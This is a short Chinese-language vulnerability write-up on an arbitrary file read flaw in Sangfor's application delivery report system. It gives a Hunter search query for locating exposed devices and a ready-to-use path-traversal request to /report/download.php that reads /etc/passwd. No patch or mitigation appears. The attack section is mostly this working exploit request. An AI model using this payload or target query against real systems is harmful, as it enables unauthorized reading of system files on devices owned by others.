# 深信服应用交付管理系统download存在任意文件读取漏洞

# 一、漏洞简介
SINFOR AD是深信服最新推出的应用交付系列设备，其突出特色就是SINFOR AD的智能分析功能。深信服应用交付报表系统存在任意文件读取漏洞,攻击者利用漏洞可读取设备中的指定路径文件。

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 深信服应用交付管理系统

# 三、资产测绘
+ hunter`app.name="SANGFOR 深信服应用交付报表系统"`

![1692580728281-e2c427e5-64ba-4fda-80b8-5dcd4479adb2.png](./img/inddIlyPIEVWA20l/1692580728281-e2c427e5-64ba-4fda-80b8-5dcd4479adb2-600823.png)

+ 登录页面

![1692580869733-49d82074-5a7c-4a29-9672-2f3b2f4b1557.png](./img/inddIlyPIEVWA20l/1692580869733-49d82074-5a7c-4a29-9672-2f3b2f4b1557-195155.png)

# 四、漏洞复现
```plain
GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![1713459981265-735fdb41-5657-4fbd-b2cf-4cec25a0eb5c.png](./img/inddIlyPIEVWA20l/1713459981265-735fdb41-5657-4fbd-b2cf-4cec25a0eb5c-129484.png)



> 更新: 2024-04-19 08:49:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zuh5abx5zhqimn9n>